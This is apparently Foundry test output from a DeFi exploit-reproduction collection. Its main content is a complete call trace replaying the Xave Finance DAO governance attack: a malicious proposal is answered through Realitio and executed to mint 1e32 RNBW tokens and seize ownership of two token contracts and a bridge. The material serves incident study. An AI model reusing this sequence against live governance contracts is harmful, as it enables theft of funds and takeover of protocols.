Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.26s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 251.64ms (202.74µs CPU time)

Ran 1 test for src/test/2022-10/XaveFinance_exp.sol:XaveFinanceExploit
[PASS] testAttack() (gas: 920847)
Logs:
  [Before proposal Execution] Owner of $RNBW: : 0x7eaE370E6a76407C3955A2f0BBCA853C38e6454E
  [Before proposal Execution] Owner of $LPOP: : 0x7eaE370E6a76407C3955A2f0BBCA853C38e6454E
  [Before proposal Execution] Owner of PrimaryBridge: : 0x7eaE370E6a76407C3955A2f0BBCA853C38e6454E
  [Before proposal Execution] Attacker's $RNBW Token Balance: : 0.000000000000000000
  --------------------------------------------------------------
  [After proposal Execution] Owner of $RNBW: : 0x0f44f3489D17e42ab13A6beb76E57813081fc1E2
  [After proposal Execution] Owner of $LPOP: : 0x0f44f3489D17e42ab13A6beb76E57813081fc1E2
  [After proposal Execution] Owner of PrimaryBridge: : 0x0f44f3489D17e42ab13A6beb76E57813081fc1E2
  [After proposal Execution] Attacker's $RNBW Token Balance: : 100000000000000.000000000000000000

Traces:
  [920847] XaveFinanceExploit::testAttack()
    ├─ [4245] DAO_MODULE::getTransactionHash(RNBW_TOKEN: [0xE94B97b6b43639E238c851A7e693F50033EfD75C], 0, 0x40c10f190000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e200000000000000000000000000000000000004ee2d6d415b85acef8100000000, 0, 0) [staticcall]
    │   └─ ← [Return] 0x920be15788d94a0bee09f9f7bcbdad2e47ef4a59f684d9bb06b657083e576c0a
    ├─ [4233] DAO_MODULE::getTransactionHash(RNBW_TOKEN: [0xE94B97b6b43639E238c851A7e693F50033EfD75C], 0, 0xf2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2, 0, 1) [staticcall]
    │   └─ ← [Return] 0xa76f7716abd0c04dcd5e627b349fea606f0133d93ce8381d450e976b6ef7b9ca
    ├─ [4233] DAO_MODULE::getTransactionHash(LPOP_TOKEN: [0x6335A2E4a2E304401fcA4Fc0deafF066B813D055], 0, 0xf2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2, 0, 2) [staticcall]
    │   └─ ← [Return] 0xe99095062d9e0d131e25a230c8a84345b37b979bd6f7b0b9e1850a0847339b6d
    ├─ [4233] DAO_MODULE::getTransactionHash(PRIMARY_BRIDGE: [0x579270F151D142eb8BdC081043a983307Aa15786], 0, 0xf2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2, 0, 3) [staticcall]
    │   └─ ← [Return] 0x14f07b03beee17f568bdb8627c3a521b1a7c99cd7abcafec9a015d93c3fb9293
    ├─ [173944] DAO_MODULE::addProposal("2", [0x920be15788d94a0bee09f9f7bcbdad2e47ef4a59f684d9bb06b657083e576c0a, 0xa76f7716abd0c04dcd5e627b349fea606f0133d93ce8381d450e976b6ef7b9ca, 0xe99095062d9e0d131e25a230c8a84345b37b979bd6f7b0b9e1850a0847339b6d, 0x14f07b03beee17f568bdb8627c3a521b1a7c99cd7abcafec9a015d93c3fb9293])
    │   ├─ [63053] REALITIO::askQuestion(18, "2␟78c41ba3945a5b26aacff77931bde687b1409cfa5b3000c8f5315c191d01626e", XAVE_GNOSIS_SAFE_MULTISIG: [0x7eaE370E6a76407C3955A2f0BBCA853C38e6454E], 1, 0, 0)
    │   │   ├─  emit topic 0: 0xfe2dac156a3890636ce13f65f4fdf41dcaee11526e4a5374531572d92194796c
    │   │   │        topic 1: 0x00b085265e9c3dd5070453c6a625285263dd087938b50b89d2b45390c9558b1e
    │   │   │        topic 2: 0x0000000000000000000000008f9036732b9aa9b82d8f35e54b71faeb2f573e2f
    │   │   │        topic 3: 0x27e1b553dae72054766c7981019a1c79cf0dd9b059bb77edd2d26d3007bbad78
    │   │   │           data: 0x000000000000000000000000000000000000000000000000000000000000001200000000000000000000000000000000000000000000000000000000000000e00000000000000000000000007eae370e6a76407c3955a2f0bbca853c38e6454e000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006341ad13000000000000000000000000000000000000000000000000000000000000004432e2909f3738633431626133393435613562323661616366663737393331626465363837623134303963666135623330303063386635333135633139316430313632366500000000000000000000000000000000000000000000000000000000
    │   │   └─ ← [Return] 0x00b085265e9c3dd5070453c6a625285263dd087938b50b89d2b45390c9558b1e
    │   ├─ emit ProposalQuestionCreated(param0: 0x00b085265e9c3dd5070453c6a625285263dd087938b50b89d2b45390c9558b1e, param1: 0xad7c5bef027816a800da1736444fb58a807ef4c9603b7848673f7e3a68eb14a5)
    │   └─ ← [Stop] 
    ├─ [75777] DAO_MODULE::buildQuestion("2", [0x920be15788d94a0bee09f9f7bcbdad2e47ef4a59f684d9bb06b657083e576c0a, 0xa76f7716abd0c04dcd5e627b349fea606f0133d93ce8381d450e976b6ef7b9ca, 0xe99095062d9e0d131e25a230c8a84345b37b979bd6f7b0b9e1850a0847339b6d, 0x14f07b03beee17f568bdb8627c3a521b1a7c99cd7abcafec9a015d93c3fb9293]) [staticcall]
    │   └─ ← [Return] "2␟78c41ba3945a5b26aacff77931bde687b1409cfa5b3000c8f5315c191d01626e"
    ├─ [831] DAO_MODULE::questionIds(0x92534724248061d1f29181141cb70fd1e0eac6128f17d0b77e9631718e2aa613)
    │   └─ ← [Return] 0x00b085265e9c3dd5070453c6a625285263dd087938b50b89d2b45390c9558b1e
    ├─ [75224] REALITIO::submitAnswer{value: 1}(0x00b085265e9c3dd5070453c6a625285263dd087938b50b89d2b45390c9558b1e, 0x0000000000000000000000000000000000000000000000000000000000000001, 0)
    │   ├─  emit topic 0: 0xe47ca4ebbbc2990134d1168821f38c5e177f3d5ee564bffeadeaa351905e6221
    │   │        topic 1: 0x00b085265e9c3dd5070453c6a625285263dd087938b50b89d2b45390c9558b1e
    │   │        topic 2: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   │           data: 0x00000000000000000000000000000000000000000000000000000000000000017b36426d0a8a5c8f3815e314cc86d00e990d094a6d38d55124b3b351c68122960000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000006341ad130000000000000000000000000000000000000000000000000000000000000000
    │   └─ ← [Stop] 
    ├─ [0] VM::warp(1665334931 [1.665e9])
    │   └─ ← [Return] 
    ├─ [2661] RNBW_TOKEN::owner() [staticcall]
    │   └─ ← [Return] XAVE_GNOSIS_SAFE_MULTISIG: [0x7eaE370E6a76407C3955A2f0BBCA853C38e6454E]
    ├─ emit log_named_address(key: "[Before proposal Execution] Owner of $RNBW: ", val: XAVE_GNOSIS_SAFE_MULTISIG: [0x7eaE370E6a76407C3955A2f0BBCA853C38e6454E])
    ├─ [2494] LPOP_TOKEN::owner() [staticcall]
    │   └─ ← [Return] XAVE_GNOSIS_SAFE_MULTISIG: [0x7eaE370E6a76407C3955A2f0BBCA853C38e6454E]
    ├─ emit log_named_address(key: "[Before proposal Execution] Owner of $LPOP: ", val: XAVE_GNOSIS_SAFE_MULTISIG: [0x7eaE370E6a76407C3955A2f0BBCA853C38e6454E])
    ├─ [2611] PRIMARY_BRIDGE::owner() [staticcall]
    │   └─ ← [Return] XAVE_GNOSIS_SAFE_MULTISIG: [0x7eaE370E6a76407C3955A2f0BBCA853C38e6454E]
    ├─ emit log_named_address(key: "[Before proposal Execution] Owner of PrimaryBridge: ", val: XAVE_GNOSIS_SAFE_MULTISIG: [0x7eaE370E6a76407C3955A2f0BBCA853C38e6454E])
    ├─ [2864] RNBW_TOKEN::balanceOf(ATTACKER_EOA: [0x0f44f3489D17e42ab13A6beb76E57813081fc1E2]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_decimal_uint(key: "[Before proposal Execution] Attacker's $RNBW Token Balance: ", val: 0, decimals: 18)
    ├─ [0] VM::startPrank(ATTACKER_CONTRACT: [0xE167cdAAc8718b90c03Cf2CB75DC976E24EE86D3])
    │   └─ ← [Return] 
    ├─ [152018] DAO_MODULE::executeProposalWithIndex("2", [0x920be15788d94a0bee09f9f7bcbdad2e47ef4a59f684d9bb06b657083e576c0a, 0xa76f7716abd0c04dcd5e627b349fea606f0133d93ce8381d450e976b6ef7b9ca, 0xe99095062d9e0d131e25a230c8a84345b37b979bd6f7b0b9e1850a0847339b6d, 0x14f07b03beee17f568bdb8627c3a521b1a7c99cd7abcafec9a015d93c3fb9293], RNBW_TOKEN: [0xE94B97b6b43639E238c851A7e693F50033EfD75C], 0, 0x40c10f190000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e200000000000000000000000000000000000004ee2d6d415b85acef8100000000, 0, 0)
    │   ├─ [1627] REALITIO::resultFor(0x00b085265e9c3dd5070453c6a625285263dd087938b50b89d2b45390c9558b1e) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   ├─ [1130] REALITIO::getFinalizeTS(0x00b085265e9c3dd5070453c6a625285263dd087938b50b89d2b45390c9558b1e) [staticcall]
    │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000006341ad14
    │   ├─ [38346] XAVE_GNOSIS_SAFE_MULTISIG::execTransactionFromModule(RNBW_TOKEN: [0xE94B97b6b43639E238c851A7e693F50033EfD75C], 0, 0x40c10f190000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e200000000000000000000000000000000000004ee2d6d415b85acef8100000000, 0)
    │   │   ├─ [33473] 0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F::execTransactionFromModule(RNBW_TOKEN: [0xE94B97b6b43639E238c851A7e693F50033EfD75C], 0, 0x40c10f190000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e200000000000000000000000000000000000004ee2d6d415b85acef8100000000, 0) [delegatecall]
    │   │   │   ├─ [28822] RNBW_TOKEN::mint(ATTACKER_EOA: [0x0f44f3489D17e42ab13A6beb76E57813081fc1E2], 100000000000000000000000000000000 [1e32])
    │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ATTACKER_EOA: [0x0f44f3489D17e42ab13A6beb76E57813081fc1E2], value: 100000000000000000000000000000000 [1e32])
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ emit ExecutionFromModuleSuccess(param0: DAO_MODULE: [0x8f9036732b9aa9b82D8F35e54B71faeb2f573E2F])
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   └─ ← [Stop] 
    ├─ [118368] DAO_MODULE::executeProposalWithIndex("2", [0x920be15788d94a0bee09f9f7bcbdad2e47ef4a59f684d9bb06b657083e576c0a, 0xa76f7716abd0c04dcd5e627b349fea606f0133d93ce8381d450e976b6ef7b9ca, 0xe99095062d9e0d131e25a230c8a84345b37b979bd6f7b0b9e1850a0847339b6d, 0x14f07b03beee17f568bdb8627c3a521b1a7c99cd7abcafec9a015d93c3fb9293], RNBW_TOKEN: [0xE94B97b6b43639E238c851A7e693F50033EfD75C], 0, 0xf2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2, 0, 1)
    │   ├─ [1627] REALITIO::resultFor(0x00b085265e9c3dd5070453c6a625285263dd087938b50b89d2b45390c9558b1e) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   ├─ [1130] REALITIO::getFinalizeTS(0x00b085265e9c3dd5070453c6a625285263dd087938b50b89d2b45390c9558b1e) [staticcall]
    │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000006341ad14
    │   ├─ [8753] XAVE_GNOSIS_SAFE_MULTISIG::execTransactionFromModule(RNBW_TOKEN: [0xE94B97b6b43639E238c851A7e693F50033EfD75C], 0, 0xf2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2, 0)
    │   │   ├─ [8386] 0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F::execTransactionFromModule(RNBW_TOKEN: [0xE94B97b6b43639E238c851A7e693F50033EfD75C], 0, 0xf2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2, 0) [delegatecall]
    │   │   │   ├─ [5741] RNBW_TOKEN::transferOwnership(ATTACKER_EOA: [0x0f44f3489D17e42ab13A6beb76E57813081fc1E2])
    │   │   │   │   ├─ emit OwnershipTransferred(previousOwner: XAVE_GNOSIS_SAFE_MULTISIG: [0x7eaE370E6a76407C3955A2f0BBCA853C38e6454E], newOwner: ATTACKER_EOA: [0x0f44f3489D17e42ab13A6beb76E57813081fc1E2])
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ emit ExecutionFromModuleSuccess(param0: DAO_MODULE: [0x8f9036732b9aa9b82D8F35e54B71faeb2f573E2F])
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   └─ ← [Stop] 
    ├─ [118147] DAO_MODULE::executeProposalWithIndex("2", [0x920be15788d94a0bee09f9f7bcbdad2e47ef4a59f684d9bb06b657083e576c0a, 0xa76f7716abd0c04dcd5e627b349fea606f0133d93ce8381d450e976b6ef7b9ca, 0xe99095062d9e0d131e25a230c8a84345b37b979bd6f7b0b9e1850a0847339b6d, 0x14f07b03beee17f568bdb8627c3a521b1a7c99cd7abcafec9a015d93c3fb9293], LPOP_TOKEN: [0x6335A2E4a2E304401fcA4Fc0deafF066B813D055], 0, 0xf2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2, 0, 2)
    │   ├─ [1627] REALITIO::resultFor(0x00b085265e9c3dd5070453c6a625285263dd087938b50b89d2b45390c9558b1e) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   ├─ [1130] REALITIO::getFinalizeTS(0x00b085265e9c3dd5070453c6a625285263dd087938b50b89d2b45390c9558b1e) [staticcall]
    │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000006341ad14
    │   ├─ [8532] XAVE_GNOSIS_SAFE_MULTISIG::execTransactionFromModule(LPOP_TOKEN: [0x6335A2E4a2E304401fcA4Fc0deafF066B813D055], 0, 0xf2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2, 0)
    │   │   ├─ [8165] 0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F::execTransactionFromModule(LPOP_TOKEN: [0x6335A2E4a2E304401fcA4Fc0deafF066B813D055], 0, 0xf2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2, 0) [delegatecall]
    │   │   │   ├─ [5520] LPOP_TOKEN::transferOwnership(ATTACKER_EOA: [0x0f44f3489D17e42ab13A6beb76E57813081fc1E2])
    │   │   │   │   ├─ emit OwnershipTransferred(previousOwner: XAVE_GNOSIS_SAFE_MULTISIG: [0x7eaE370E6a76407C3955A2f0BBCA853C38e6454E], newOwner: ATTACKER_EOA: [0x0f44f3489D17e42ab13A6beb76E57813081fc1E2])
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ emit ExecutionFromModuleSuccess(param0: DAO_MODULE: [0x8f9036732b9aa9b82D8F35e54B71faeb2f573E2F])
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   └─ ← [Stop] 
    ├─ [118171] DAO_MODULE::executeProposalWithIndex("2", [0x920be15788d94a0bee09f9f7bcbdad2e47ef4a59f684d9bb06b657083e576c0a, 0xa76f7716abd0c04dcd5e627b349fea606f0133d93ce8381d450e976b6ef7b9ca, 0xe99095062d9e0d131e25a230c8a84345b37b979bd6f7b0b9e1850a0847339b6d, 0x14f07b03beee17f568bdb8627c3a521b1a7c99cd7abcafec9a015d93c3fb9293], PRIMARY_BRIDGE: [0x579270F151D142eb8BdC081043a983307Aa15786], 0, 0xf2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2, 0, 3)
    │   ├─ [1627] REALITIO::resultFor(0x00b085265e9c3dd5070453c6a625285263dd087938b50b89d2b45390c9558b1e) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   ├─ [1130] REALITIO::getFinalizeTS(0x00b085265e9c3dd5070453c6a625285263dd087938b50b89d2b45390c9558b1e) [staticcall]
    │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000006341ad14
    │   ├─ [8556] XAVE_GNOSIS_SAFE_MULTISIG::execTransactionFromModule(PRIMARY_BRIDGE: [0x579270F151D142eb8BdC081043a983307Aa15786], 0, 0xf2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2, 0)
    │   │   ├─ [8189] 0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F::execTransactionFromModule(PRIMARY_BRIDGE: [0x579270F151D142eb8BdC081043a983307Aa15786], 0, 0xf2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2, 0) [delegatecall]
    │   │   │   ├─ [5544] PRIMARY_BRIDGE::transferOwnership(ATTACKER_EOA: [0x0f44f3489D17e42ab13A6beb76E57813081fc1E2])
    │   │   │   │   ├─ emit OwnershipTransferred(previousOwner: XAVE_GNOSIS_SAFE_MULTISIG: [0x7eaE370E6a76407C3955A2f0BBCA853C38e6454E], newOwner: ATTACKER_EOA: [0x0f44f3489D17e42ab13A6beb76E57813081fc1E2])
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ emit ExecutionFromModuleSuccess(param0: DAO_MODULE: [0x8f9036732b9aa9b82D8F35e54B71faeb2f573E2F])
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   └─ ← [Stop] 
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return] 
    ├─ emit log_string(val: "--------------------------------------------------------------")
    ├─ [661] RNBW_TOKEN::owner() [staticcall]
    │   └─ ← [Return] ATTACKER_EOA: [0x0f44f3489D17e42ab13A6beb76E57813081fc1E2]
    ├─ emit log_named_address(key: "[After proposal Execution] Owner of $RNBW: ", val: ATTACKER_EOA: [0x0f44f3489D17e42ab13A6beb76E57813081fc1E2])
    ├─ [494] LPOP_TOKEN::owner() [staticcall]
    │   └─ ← [Return] ATTACKER_EOA: [0x0f44f3489D17e42ab13A6beb76E57813081fc1E2]
    ├─ emit log_named_address(key: "[After proposal Execution] Owner of $LPOP: ", val: ATTACKER_EOA: [0x0f44f3489D17e42ab13A6beb76E57813081fc1E2])
    ├─ [611] PRIMARY_BRIDGE::owner() [staticcall]
    │   └─ ← [Return] ATTACKER_EOA: [0x0f44f3489D17e42ab13A6beb76E57813081fc1E2]
    ├─ emit log_named_address(key: "[After proposal Execution] Owner of PrimaryBridge: ", val: ATTACKER_EOA: [0x0f44f3489D17e42ab13A6beb76E57813081fc1E2])
    ├─ [864] RNBW_TOKEN::balanceOf(ATTACKER_EOA: [0x0f44f3489D17e42ab13A6beb76E57813081fc1E2]) [staticcall]
    │   └─ ← [Return] 100000000000000000000000000000000 [1e32]
    ├─ emit log_named_decimal_uint(key: "[After proposal Execution] Attacker's $RNBW Token Balance: ", val: 100000000000000000000000000000000 [1e32], decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 331.79ms (5.15ms CPU time)

Ran 2 test suites in 333.28ms (583.42ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
